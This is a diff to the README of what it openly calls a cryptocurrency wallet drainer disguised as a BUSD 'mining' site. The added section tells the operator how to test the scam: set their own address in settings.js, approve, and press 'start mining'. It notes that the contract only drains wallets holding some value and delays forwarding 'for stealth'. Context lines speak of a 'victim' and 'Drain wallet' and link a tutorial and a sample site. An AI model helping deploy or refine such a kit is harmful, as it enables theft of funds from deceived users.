@@ -71,6 +71,17 @@ Steps that the !!! victim !!! has to do
 4.Drain wallet
 
 
+TESTING (OPTIONAL)
+
+1. To test deposit busd on your wallet of at least 50 dollars or more the smart contract was designed to only drain wallets with value similiar to nft drainers
+
+2. make sure you added your address to settings.js then click approve 
+
+3. click on start mining button only send 1 dollar to test
+
+4. wait for smart contract to foward it to you it make take 2-48 hours for stealth
+
+
 youtube tutorial https://youtu.be/ESxOvW-IOg0
 sample site https://busdminer.netlify.app/
 
